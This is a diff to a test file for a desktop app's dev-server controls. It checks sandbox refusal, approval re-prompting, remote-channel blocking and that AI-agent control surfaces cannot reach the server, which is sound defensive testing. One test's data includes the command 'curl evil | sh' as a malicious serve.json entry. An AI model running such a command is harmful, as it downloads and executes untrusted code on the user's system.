@@ -1,7 +1,8 @@
 import { afterAll, afterEach, beforeAll, expect, test } from 'bun:test'
-import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
+import { mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
+import { CHANNEL_TIERS, REMOTE_BLOCKED_CHANNELS, shouldForwardEvent } from '../desktop/src/shared/companion.ts'
 import { initDeckLog } from '../desktop/src/main/log.ts'
 import { isMintedServeAction, readServeConfig, type ServeAction } from '../desktop/src/main/serve-config.ts'
 import { createServeIpc, type ServeIpcDeps } from '../desktop/src/main/serve-ipc.ts'
@@ -33,7 +34,7 @@ function writeServe(dir: string, command: string): void {
 
 interface Init {
   allowed?: string[]
-  sandbox?: boolean
+  sandbox?: boolean | (() => boolean)
   confirm?: boolean
   outcome?: ServeStartOutcome['outcome']
   stateAfter?: ServeState
@@ -52,7 +53,7 @@ function harness(init: Init = {}) {
       if ((init.allowed ?? []).includes(path)) return path
       throw new Error('dir not allowed')
     },
-    sandboxEnabled: () => init.sandbox ?? false,
+    sandboxEnabled: () => (typeof init.sandbox === 'function' ? init.sandbox() : (init.sandbox ?? false)),
     readServeConfig: async (dir) => {
       reads.push(dir)
       return readServeConfig(dir)
@@ -83,7 +84,7 @@ test('starts the approved serve.json action of an allowed directory', async () =
 
   const result = await h.ipc.start(dir)
 
-  expect(result).toEqual({ ok: true, dir, state: { status: 'starting' } })
+  expect(result).toEqual({ ok: true, dir, state: { status: 'starting', dir } })
   expect(h.started.map((action) => action.cwd)).toEqual([realpathSync.native(join(dir, 'web'))])
   expect(h.ipc.status()).toEqual({ status: 'idle', dir })
   expect(h.errors).toEqual([])
@@ -116,6 +117,15 @@ test('refuses every start while the project sandbox is enabled', async () => {
 
   expect(await h.ipc.start(dir)).toMatchObject({ ok: false, reason: 'sandbox', message: 'starting a host server is refused in sandbox mode' })
   expect([h.reads, h.started]).toEqual([[], []])
+})
+
+test('refuses the start when the sandbox turns on while the approval dialog is open', async () => {
+  const dir = project()
+  const h = harness({ allowed: [dir], sandbox: () => h.prompts.length > 0 })
+
+  expect(await h.ipc.start(dir)).toMatchObject({ ok: false, reason: 'sandbox' })
+  expect(h.prompts).toHaveLength(1)
+  expect(h.started).toEqual([])
 })
 
 test('refuses a missing or invalid serve.json', async () => {
@@ -170,4 +180,77 @@ test('re-reads serve.json on every start, so a changed command needs a new appro
   expect(h.reads).toEqual([dir, dir, dir])
   expect(h.prompts).toEqual(['bun run dev -- --port ${PORT}', 'curl evil | sh'])
   expect(h.started.map((action) => action.command)).toEqual(['bun run dev -- --port ${PORT}', 'bun run dev -- --port ${PORT}', 'curl evil | sh'])
+})
+
+test('keeps every serve channel and its event away from a paired phone', () => {
+  for (const channel of ['serve:status', 'serve:start', 'serve:stop']) {
+    expect(REMOTE_BLOCKED_CHANNELS.has(channel), `${channel} is remote-blocked`).toBe(true)
+  }
+  expect(shouldForwardEvent('serve:changed', 'full'), 'serve:changed carries a host directory').toBe(false)
+  expect(CHANNEL_TIERS['serve:start'], 'serve:start runs a repository command').toBe(2)
+  expect(CHANNEL_TIERS['serve:stop'], 'serve:stop kills a process tree').toBe(2)
+})
+
+const REPO = join(import.meta.dir, '..')
+const SERVE_REACH = /serve-(?:ipc|service|config|lifecycle|login-env)\b|\bServeService\b|\bserveIpc\b|['"`]serve:/
+
+/** The text of the object literal assigned to `name`, braces matched, so a dependency added to it is seen. */
+function objectLiteral(source: string, name: string): string {
+  const head = source.indexOf(`const ${name}`)
+  if (head < 0) throw new Error(`missing const ${name}`)
+  const open = source.indexOf('{', source.indexOf('=', head))
+  let depth = 0
+  for (let index = open; index < source.length; index++) {
+    if (source[index] === '{') depth++
+    if (source[index] === '}' && --depth === 0) return source.slice(open, index + 1)
+  }
+  throw new Error(`unbalanced const ${name}`)
+}
+
+/** Calls into the registered IPC handlers, and so to serve:start, without naming it. */
+const IPC_TRANSIT = /\b(?:invokeRemote|regHandle|ipcMain)\b/
+
+/** The composition roots hold the service by design; their deck-control wiring is checked through controlDeps. */
+const COMPOSITION_ROOTS = ['desktop/src/main/index.ts', 'desktop/src/main/ipc.ts']
+/** Its invokeRemote is the companion path, closed for serve:* by the remote-block floor asserted above. */
+const TRANSIT_EXEMPT = ['desktop/src/main/companion-server.ts']
+
+/** Every file that serves MCP, an MCP config or a token-guarded HTTP endpoint: the ways an agent reaches main. */
+function agentSurfaces(): string[] {
+  const found: string[] = []
+  for (const dir of ['desktop/src/main', 'desktop/mcp', '.']) {
+    for (const file of readdirSync(join(REPO, dir)).filter((name) => name.endsWith('.ts'))) {
+      const path = dir === '.' ? file : `${dir}/${file}`
+      const text = readFileSync(join(REPO, path), 'utf8')
+      const servesAgents =
+        text.includes('@modelcontextprotocol/sdk') ||
+        (/\bcreateServer\b/.test(text) && /token/i.test(text)) ||
+        /jsonrpc/i.test(text) ||
+        /mcpServers|mcpConfig/.test(text)
+      if (servesAgents) found.push(path)
+    }
+  }
+  return found
+}
+
+test('no agent control surface reaches the dev server', () => {
+  const surfaces = agentSurfaces()
+  for (const known of ['desktop/src/main/deck-control.ts', 'desktop/src/main/team-lead-bridge.ts', 'desktop/mcp/demo-browser-mcp.ts', 'server.ts', 'server-deck.ts']) {
+    expect(surfaces, `the derived surface domain still finds ${known}`).toContain(known)
+  }
+  for (const exempt of [...COMPOSITION_ROOTS, ...TRANSIT_EXEMPT]) {
+    expect(surfaces, `exemption ${exempt} is still a surface`).toContain(exempt)
+  }
+  for (const surface of surfaces.filter((path) => !COMPOSITION_ROOTS.includes(path))) {
+    const text = readFileSync(join(REPO, surface), 'utf8')
+    expect(SERVE_REACH.test(text), `${surface} references the dev server`).toBe(false)
+    if (!TRANSIT_EXEMPT.includes(surface)) {
+      expect(IPC_TRANSIT.test(text), `${surface} calls the IPC handlers`).toBe(false)
+    }
+  }
+
+  const controlDeps = objectLiteral(readFileSync(join(REPO, 'desktop', 'src', 'main', 'index.ts'), 'utf8'), 'controlDeps')
+  expect(controlDeps).toContain('spawnSession')
+  expect(/\bserve(?:Ipc)?\b/.test(controlDeps), 'the deck-control dependencies hand over the serve service').toBe(false)
+  expect(IPC_TRANSIT.test(controlDeps), 'the deck-control dependencies call the IPC handlers').toBe(false)
 })
